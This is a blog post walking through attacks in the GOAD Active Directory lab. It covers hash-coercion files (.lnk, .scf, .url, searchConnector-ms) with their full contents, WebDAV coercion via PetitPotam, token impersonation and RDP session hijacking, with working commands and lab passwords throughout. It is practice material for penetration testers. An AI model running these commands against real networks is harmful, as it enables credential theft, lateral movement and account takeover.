---
layout: post
title:  "GOAD - part 13 - Having fun inside a domain"
category : [AD, GOAD]
tags :  AD, Lab, slinky, url, webdav, impersonate, rdphijack
---

On the previous post ([Goad pwning part12]({% link _posts/2022-12-21-GOADv2-pwning-part12.md %})) we had fun with with the domains trusts.
I know, i said the 12 part will be the last, but some of the technics presented here are quite fun i wanted to document and practive them in the lab.

The different technics presented here need an active user to exploit them.
As most of the time there is no bot on the lab to simulate the victims, you will have to simulate the victim with an RDP connection.

> This demo is done on my proxmox environment, if you do that on your local deployment change 10.10.10.6 ip with your host ip (192.168.56.1) and for servers change 192.168.56.x to 192.168.10.x

## Coerce me with files

First i will show you different files to drop on windows to coerce an authentication on your server.
These coerce attacks are very well presented in the following talk by gabriel (@vendetce), i recommend you to watch : [https://www.youtube.com/watch?v=b0lLxLJKaRs](https://www.youtube.com/watch?v=b0lLxLJKaRs).

- To do the victim we will launch an rdp session on winterfell with catelyn:

```bash
xfreerdp /d:north.sevenkingdoms.local /u:catelyn.stark /p:robbsansabradonaryarickon /v:winterfell.north.sevenkingdoms.local /cert-ignore
```

- First let's take a look at castelblack server shares:

```bash
cme smb castelblack.north.sevenkingdoms.local -u arya.stark -p 'Needle' -d north.sevenkingdoms.local --shares
```

![part13_cme_shares.png](/assets/blog/GOAD/part13_cme_shares.png)

- The all share is available in read/write so we could use it for our attack.

### slinky : .lnk file

For our first exploitation we will create a file with the cme module **slinky**.

- This module will drop an lnk file in every writable folder on the target server :

Let's drop the file :

```bash
cme smb castelblack.north.sevenkingdoms.local -u arya.stark -p 'Needle' -d north.sevenkingdoms.local -M slinky -o NAME=.thumbs.db SERVER=attacker_ip
```

![part13_cme_slinky.png](/assets/blog/GOAD/part13_cme_slinky.png)

- Launch responder and listen the network interface you use for goad (vboxnet0 or tun0):

```bash
responder -I tun0
```

- Go to the rdp screen with catelyn : `\\castelblack.north.sevenkingdoms.local\all`

![part13_rdp_to_slinky.png](/assets/blog/GOAD/part13_rdp_to_slinky.png)

- And you will receive Catelyn's NetNTLMv2 hash directly in responder :

![part13_slinky_result.png](/assets/blog/GOAD/part13_slinky_result.png)

> This coerce append automatically when the victim visit the share, no need to click! I let you imagine what append if you drop that kind of file on a common public share during your pentest.
{: .prompt-tip }

> Here the file start with a "." so it will be hidden if you don't activate show hidden file option.
> The coerce only append when the file is showed (so in a pentest i recommend to not use a filename starting with ".")
{: .prompt-info }

Obviously we could also do a ntlmrelayx to not smb signed server and get share access or admin access depending on the relayed authentication target.

- And to cleanup the slinky file : 

```bash
cme smb castelblack.north.sevenkingdoms.local -u arya.stark -p 'Needle' -d north.sevenkingdoms.local -M slinky -o NAME=.thumbs.db SERVER=attacker_ip CLEANUP=true
```

### .scf : sucffy

- Cme also got an other module, with the name "scuffy" and it act exactly the same as slinky but with scf file.

### .url file

- We can do the same with a .url file: `vim clickme.url`

```
[InternetShortcut]
URL=http://click.me/pwned
WorkingDirectory=test
IconFile=\\10.10.10.6\%USERNAME%.icon
IconIndex=1
```

- Upload the file :

```
smbclient.py north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local
use all
put clickme.url
```

![part13_url_upload.png](/assets/blog/GOAD/part13_url_upload.png)

- And we also get the callback when the victim visit the share:

![part13_url_callback.png](/assets/blog/GOAD/part13_url_callback.png)

> Even if i named it "clickme.url" there is no need to click to coerce the user, a simple visit is enough
{: .prompt-tip }

## Webdav coerce

- first let's take a look if webdav is enable on servers: 

```bash
cme smb 192.168.10.10-23 -u arya.stark -p 'Needle' -d north.sevenkingdoms.local -M webdav
```

![part13_cme_webdav.png](/assets/blog/GOAD/part13_cme_webdav.png)

- There is no webdav server enabled.

- For this example we will use braavos server as a victim :

```bash
xfreerdp /d:essos.local /u:khal.drogo /p:horse /v:braavos.essos.local /cert-ignore
```

- On this server webclient is installed as we can see in the process but stopped

![part13_webclient_service.png](/assets/blog/GOAD/part13_webclient_service.png)

> Webclient is installed by default on windows workstations but in a stopped status. Webclient is not installed by default on windows server, it has been added on goad build as a custom vulnerability.
{: .prompt-info }

- Now we will upload our malicous payload to the smb server with the name : `myname.searchConnector-ms`

```
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription
xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
<description>Microsoft Outlook</description>
<isSearchOnlyItem>false</isSearchOnlyItem>
<includeInStartMenuScope>true</includeInStartMenuScope>
<templateInfo>
<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
</templateInfo>
<simpleLocation>
<url>https://whatever/</url>
</simpleLocation>
</searchConnectorDescription>
```

- Or we could also do that with the cme module **drop-sc**

```bash
cme smb castelblack.north.sevenkingdoms.local -u arya.stark -p 'Needle' -d north.sevenkingdoms.local -M drop-sc
```

![part13_drop-sc.png](/assets/blog/GOAD/part13_drop-sc.png)

- Now we visit the share with our victim khal.drogo rdp session : `\\castelblack\all`
- And as soon as we enter the folder the webclient service start :

![part13_drop-sc-start-webclient.png](/assets/blog/GOAD/part13_drop-sc-start-webclient.png)

>Just to be clear here we are connected as khal drogo on braavos. The malicious document is on castelblack. When khal visit the share all on castelblack containing our malicious document, the webclient service start on braavos (kahl's client machine)

- We can verify it with cme too :

![part13_cme-webclient.png](/assets/blog/GOAD/part13_cme-webclient.png)

- now we will go on our responder CT to get the webdav coerce

- Once the webclient started we can add a dns entry to our responder ip with [dnstools](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py):

```bash
dnstool.py -u 'north.sevenkingdoms.local\arya.stark' -p Needle --record 'responder' --action add --data 10.10.10.6 192.168.10.11
```

![part13_add_dns_entry.png](/assets/blog/GOAD/part13_add_dns_entry.png)

- Now if we are in the same network we can try directly or if we are in another network we will have to wait for the dns.

- Next we use petitpotam on the server with webdav enabled to force a webdav (**http**) coerce to our server :

```bash
petitpotam.py -u 'arya.stark' -p Needle -d 'north.sevenkingdoms.local' "responder@80/random.txt" 192.168.10.23
```

![part13_webdav_responder.png](/assets/blog/GOAD/part13_webdav_responder.png)

- Another way to do if the victim can resolve your netbios name you will not have to add a dns entry an you can use the netbios name given by responder

![part13_webdav_respondernetbios.png](/assets/blog/GOAD/part13_webdav_respondernetbios.png)

```bash
petitpotam.py -u 'arya.stark' -p Needle -d 'north.sevenkingdoms.local' "WIN-6WQ7CSHQ2YG@80/random.txt" 192.168.10.23
```

- And on our listener we got a connection :

![part13_webdav_respondernetbios2.png](/assets/blog/GOAD/part13_webdav_respondernetbios2.png)

> With an http coerce we can relay to **ldap** if ldap signing is not enforced (default). This can be use to interrogate ldap, do a shadow credentials attack, or to add a new computer and do an RBCD on the coerced host. (Theses attacks are described in part 4 - poisoning)
{: .prompt-tip }

## Impersonate Users

- Another cool way to take other accounts is using token impersonation.

- A nice article about it can be found here : [https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)

- In order to do impersonation we can use the module created by @deft : [https://github.com/sensepost/impersonate](https://github.com/sensepost/impersonate)

```bash
cme smb castelblack.north.sevenkingdoms.local -u jeor.mormont -p  '_L0ngCl@w_' -d north.sevenkingdoms.local -M impersonate 
```

![part13_impersonate_token.png](/assets/blog/GOAD/part13_impersonate_token.png)

- And we can launch command as the user :

![part13_impersonate_token_user.png](/assets/blog/GOAD/part13_impersonate_token_user.png)

- If you want to use other tools you can use @_zblurx rust implementation : [https://github.com/zblurx/impersonate-rs](https://github.com/zblurx/impersonate-rs)

- Or a csharp impersonation tool by S3cur3Th1sSh1t (@ShitSecure) : https://github.com/S3cur3Th1sSh1t/SharpImpersonation and the super nice blogpost with it : [https://s3cur3th1ssh1t.github.io/SharpImpersonation-Introduction/](https://s3cur3th1ssh1t.github.io/SharpImpersonation-Introduction/)

- And if you already got an meterpreter session the incognito msf module is really nice too.

## RDP session hijacking

- This doesn't work on windows server 2019 (*.sevenkingdoms.local computers), but it work nicely on *.essos.local (windows server 2016).

- First connect the victim to braavos : 

```bash
xfreerdp /d:essos.local /u:daenerys.targaryen /p:'BurnThemAll!' /v:192.168.10.23 /cert-ignore
```

- and launch a notepad.exe on the session to distinguish it easily.

![part13_rdp_daenerys.png](/assets/blog/GOAD/part13_rdp_daenerys.png)

- Next we use khal drogo as the attacker

```bash
xfreerdp /d:essos.local /u:khal.drogo /p:'horse' /v:192.168.10.23 /cert-ignore
```

- With khal.drogo session we need to pass authority\system, so we will just do a `Psexec64.exe -s cmd.exe`

![part13_rdp_psexec.png](/assets/blog/GOAD/part13_rdp_psexec.png)

- Nex we will list the rdp session with `query user`

![part13_rdp_users.png](/assets/blog/GOAD/part13_rdp_users.png)

- As you can see here daenerys is connected with the id 4.
- And now we will hijack the rdp session of daenerys with the following command

```
tscon.exe 4 /dest:rdp-tcp#8
```

![part13_rdp_tscon.png](/assets/blog/GOAD/part13_rdp_tscon.png)

- When we launch the command our khal's rdp session is replaced by daenerys session and the other windows we open before with daenerys is closed.

- We have hijack daenerys' rdp session !

![part13_rdp_hijack.png](/assets/blog/GOAD/part13_rdp_hijack.png)

# Resources
- [https://www.youtube.com/watch?v=b0lLxLJKaRs](https://www.youtube.com/watch?v=b0lLxLJKaRs)
- [https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/living-off-the-land](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/living-off-the-land)
- [https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/)
- [https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement](https://www.ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement)
- [https://www.csoonline.com/article/3566917/rdp-hijacking-attacks-explained-and-how-to-mitigate-them.html](https://www.csoonline.com/article/3566917/rdp-hijacking-attacks-explained-and-how-to-mitigate-them.html)